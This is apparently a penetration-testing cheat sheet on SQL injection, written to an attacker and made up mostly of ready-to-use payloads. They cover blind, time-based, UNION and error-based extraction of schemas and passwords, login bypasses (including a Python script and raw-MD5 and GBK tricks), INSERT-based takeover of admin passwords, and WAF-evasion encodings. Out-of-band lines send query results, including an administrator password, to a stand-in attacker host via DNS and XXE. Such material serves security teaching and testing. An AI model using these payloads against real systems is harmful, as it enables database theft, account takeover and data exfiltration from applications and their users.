What is SQL injection?

An SQL injection is a security flaw that allows attackers to interfere with database queries of an application. This vulnerability can enable attackers to view, modify, or delete data they shouldn't access, including information of other users or any data the application can access. Such actions may result in permanent changes to the application's functionality or content or even compromision of the server or denial of service.
Entry point detection

When a site appears to be vulnerable to SQL injection (SQLi) due to unusual server responses to SQLi-related inputs, the first step is to understand how to inject data into the query without disrupting it. This requires identifying the method to escape from the current context effectively. These are some useful examples:

 [Nothing]
'
"
`
')
")
`)
'))
"))
`))

Then, you need to know how to fix the query so there isn't errors. In order to fix the query you can input data so the previous query accept the new data, or you can just input your data and add a comment symbol add the end.

Note that if you can see error messages or you can spot differences when a query is working and when it's not this phase will be more easy.
Comments

MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments

Confirming with logical operations

A reliable method to confirm an SQL injection vulnerability involves executing a logical operation and observing the expected outcomes. For instance, a GET parameter such as ?username=Peter yielding identical content when modified to ?username=Peter' or '1'='1 indicates a SQL injection vulnerability.

Similarly, the application of mathematical operations serves as an effective confirmation technique. For example, if accessing ?id=1 and ?id=2-1 produce the same result, it's indicative of SQL injection.

Examples demonstrating logical operation confirmation:

page.asp?id=1 or 1=1 -- results in true
page.asp?id=1' or 1=1 -- results in true
page.asp?id=1" or 1=1 -- results in true
page.asp?id=1 and 1=2 -- results in false

This word-list was created to try to confirm SQLinjections in the proposed way:
811B
sqli-logic.txt
Confirming with Timing

In some cases you won't notice any change on the page you are testing. Therefore, a good way to discover blind SQL injections is making the DB perform actions and will have an impact on the time the page need to load.
Therefore, the we are going to concat in the SQL query an operation that will take a lot of time to complete:

MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))

In some cases the sleep functions won't be allowed. Then, instead of using those functions you could make the query perform complex operations that will take several seconds. Examples of these techniques are going to be commented separately on each technology (if any).
Identifying Back-end

The best way to identify the back-end is trying to execute functions of the different back-ends. You could use the sleep functions of the previous section or these ones (table from payloadsallthethings:

["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],

Also, if you have access to the output of the query, you could make it print the version of the database.

A continuation we are going to discuss different methods to exploit different kinds of SQL Injection. We will use MySQL as example.
Identifying with PortSwigger
LogoSQL injection cheat sheet | Web Security AcademyWebSecAcademy
Exploiting Union Based
Detecting number of columns

If you can see the output of the query this is the best way to exploit it.
First of all, wee need to find out the number of columns the initial request is returning. This is because both queries must return the same number of columns.
Two methods are typically used for this purpose:
Order/Group by

To determine the number of columns in a query, incrementally adjust the number used in ORDER BY or GROUP BY clauses until a false response is received. Despite the distinct functionalities of GROUP BY and ORDER BY within SQL, both can be utilized identically for ascertaining the query's column count.

1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
                        #-1' UNION SELECT 1,2,3--+    True

1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
                        #-1' UNION SELECT 1,2,3--+    True

UNION SELECT

Select more and more null values until the query is correct:

1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked

You should use 
null
values as in some cases the type of the columns of both sides of the query must be the same and null is valid in every case.
Extract database names, table names and column names

On the next examples we are going to retrieve the name of all the databases, the table name of a database, the column names of the table:

#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]

There is a different way to discover this data on every different database, but it's always the same methodology.
Exploiting Hidden Union Based

When the output of a query is visible, but a union-based injection seems unachievable, it signifies the presence of a hidden union-based injection. This scenario often leads to a blind injection situation. To transform a blind injection into a union-based one, the execution query on the backend needs to be discerned.

This can be accomplished through the use of blind injection techniques alongside the default tables specific to your target Database Management System (DBMS). For understanding these default tables, consulting the documentation of the target DBMS is advised.

Once the query has been extracted, it's necessary to tailor your payload to safely close the original query. Subsequently, a union query is appended to your payload, facilitating the exploitation of the newly accessible union-based injection.

For more comprehensive insights, refer to the complete article available at Healing Blind Injections.
Exploiting Error based

If for some reason you cannot see the output of the query but you can see the error messages, you can make this error messages to ex-filtrate data from the database.
Following a similar flow as in the Union Based exploitation you could manage to dump the DB.

(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))

Exploiting Blind SQLi

In this case you cannot see the results of the query or the errors, but you can distinguished when the query return a true or a false response because there are different contents on the page.
In this case, you can abuse that behaviour to dump the database char by char:

?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'

Exploiting Error Blind SQLi

This is the same case as before but instead of distinguish between a true/false response from the query you can distinguish between an error in the SQL query or not (maybe because the HTTP server crashes). Therefore, in this case you can force an SQLerror each time you guess correctly the char:

AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -

Exploiting Time Based SQLi

In this case there isn't any way to distinguish the response of the query based on the context of the page. But, you can make the page take longer to load if the guessed character is correct. We have already saw this technique in use before in order to confirm a SQLi vuln.

1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#

Stacked Queries

You can use stacked queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.

Oracle doesn't support stacked queries. MySQL, Microsoft and PostgreSQL support them: QUERY-1-HERE; QUERY-2-HERE
Out of band Exploitation

If no-other exploitation method worked, you may try to make the database ex-filtrate the info to an external host controlled by you. For example, via DNS queries:

select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));

Out of band data exfiltration via XXE

a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"> %remote;]>'),'/l') FROM dual-- -

Automated Exploitation

Check the SQLMap Cheetsheat to exploit a SQLi vulnerability with sqlmap.
Tech specific info

We have already discussed all the ways to exploit a SQL Injection vulnerability. Find some more tricks database technology dependant in this book:

    MS Access

    MSSQL

    MySQL

    Oracle

    PostgreSQL

Or you will find a lot of tricks regarding: MySQL, PostgreSQL, Oracle, MSSQL, SQLite and HQL in https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

​​​​​RootedCON is the most relevant cybersecurity event in Spain and one of the most important in Europe. With the mission of promoting technical knowledge, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.
LogoRootedCONRootedCON
Authentication bypass

List to try to bypass the login functionality:
pageLogin bypass List
Raw hash authentication Bypass

"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"

This query showcases a vulnerability when MD5 is used with true for raw output in authentication checks, making the system susceptible to SQL injection. Attackers can exploit this by crafting inputs that, when hashed, produce unexpected SQL command parts, leading to unauthorized access.

md5("ffifdyop", true) = 'or'6�]��!r,��b�
sha1("3fDf ", true) = Q�u'='�@�[�t�- o��_-!

Injected hash authentication Bypass

admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'

Recommended list:

You should use as username each line of the list and as password always: Pass1234.
(This payloads are also included in the big list mentioned at the beginning of this section)
1KB
sqli-hashbypass.txt
GBK Authentication Bypass

IF ' is being scaped you can use %A8%27, and when ' gets scaped it will be created: 0xA80x5c0x27 (╘')

%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --

Python script:

import requests
url = "http://example.com/index.php" 
cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3') 
datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"} 
r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url}) 
print r.text

Polyglot injection (multicontext)

SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/

Insert Statement
Modify password of existing object/user

To do so you should try to create a new object named as the "master object" (probably admin in case of users) modifying something:

    Create user named: AdMIn (uppercase & lowercase letters)

    Create a user named: admin=

    SQL Truncation Attack (when there is some kind of length limit in the username or email) --> Create user with name: admin [a lot of spaces] a

SQL Truncation Attack

If the database is vulnerable and the max number of chars for username is for example 30 and you want to impersonate the user admin, try to create a username called: "admin [30 spaces] a" and any password.

The database will check if the introduced username exists inside the database. If not, it will cut the username to the max allowed number of characters (in this case to: "admin [25 spaces]") and the it will automatically remove all the spaces at the end updating inside the database the user "admin" with the new password (some error could appear but it doesn't means that this hasn't worked).

More info: https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html & https://resources.infosecinstitute.com/sql-truncation-attack/#gref

Note: This attack will no longer work as described above in latest MySQL installations. While comparisons still ignore trailing whitespace by default, attempting to insert a string that is longer than the length of a field will result in an error, and the insertion will fail. For more information about about this check: https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation
MySQL Insert time based checking

Add as much ','','' as you consider to exit the VALUES statement. If delay is executed, you have a SQLInjection.

name=','');WAITFOR%20DELAY%20'0:0:5'--%20-

ON DUPLICATE KEY UPDATE

The ON DUPLICATE KEY UPDATE clause in MySQL is utilized to specify actions for the database to take when an attempt is made to insert a row that would result in a duplicate value in a UNIQUE index or PRIMARY KEY. The following example demonstrates how this feature can be exploited to modify the password of an administrator account:

Example Payload Injection:

An injection payload might be crafted as follows, where two rows are attempted to be inserted into the users table. The first row is a decoy, and the second row targets an existing administrator's email with the intention of updating the password:

INSERT INTO users (email, password) VALUES ("generic_user@example.com", "bcrypt_hash_of_newpassword"), ("admin_generic@example.com", "bcrypt_hash_of_newpassword") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_newpassword" -- ";

Here's how it works:

    The query attempts to insert two rows: one for generic_user@example.com and another for admin_generic@example.com.

    If the row for admin_generic@example.com already exists, the ON DUPLICATE KEY UPDATE clause triggers, instructing MySQL to update the password field of the existing row to "bcrypt_hash_of_newpassword".

    Consequently, authentication can then be attempted using admin_generic@example.com with the password corresponding to the bcrypt hash ("bcrypt_hash_of_newpassword" represents the new password's bcrypt hash, which should be replaced with the actual hash of the desired password).

Extract information
Creating 2 accounts at the same time

When trying to create a new user and username, password and email are needed:

SQLi payload:
username=TEST&password=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -

A new user with username=otherUsername, password=otherPassword, email:FLAG will be created

Using decimal or hexadecimal

With this technique you can extract information creating only 1 account. It is important to note that you don't need to comment anything.

Using hex2dec and substr:

'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

To get the text you can use:

__import__('binascii').unhexlify(hex(215573607263)[2:])

Using hex and replace (and substr):

'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

#Full ascii uppercase and lowercase replace:
'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%"),"z","&"),"J","'"),"K","`"),"L","("),"M",")"),"N","@"),"O","$$"),"Z","&&")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

​

​​​​​​RootedCON is the most relevant cybersecurity event in Spain and one of the most important in Europe. With the mission of promoting technical knowledge, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.
LogoRootedCONRootedCON
Routed SQL injection

Routed SQL injection is a situation where the injectable query is not the one which gives output but the output of injectable query goes to the query which gives output. (From Paper)

Example:

#Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a

WAF Bypass

Initial bypasses from here
No spaces bypass

No Space (%20) - bypass using whitespace alternatives

?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--

No Whitespace - bypass using comments

?id=1/*comment*/and/**/1=1/**/--

No Whitespace - bypass using parenthesis

?id=(1)and(1)=(1)--

No commas bypass

No Comma - bypass using OFFSET, FROM and JOIN

LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d

Generic Bypasses

Blacklist using keywords - bypass using uppercase/lowercase

?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#

Blacklist using keywords case insensitive - bypass using an equivalent operator

AND   -> && -> %26%26
OR    -> || -> %7C%7C
=     -> LIKE,REGEXP,RLIKE, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))

Scientific Notation WAF bypass

You can find a more in depth explaination of this trick in gosecure blog.
Basically you can use the scientific notation in unexpected ways for the WAF to bypass it:

-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=

Bypass Column Names Restriction

First of all, notice that if the original query and the table where you want to extract the flag from have the same amount of columns you might just do: 0 UNION SELECT * FROM flag

It’s possible to access the third column of a table without using its name using a query like the following: SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;, so in an sqlinjection this would looks like:

# This is an example with 3 columns that will extract the column number 3
-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;

Or using a comma bypass:

# In this case, it's extracting the third value from a 4 values table and returning 3 values in the "union select"
-1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c

This trick was taken from https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/
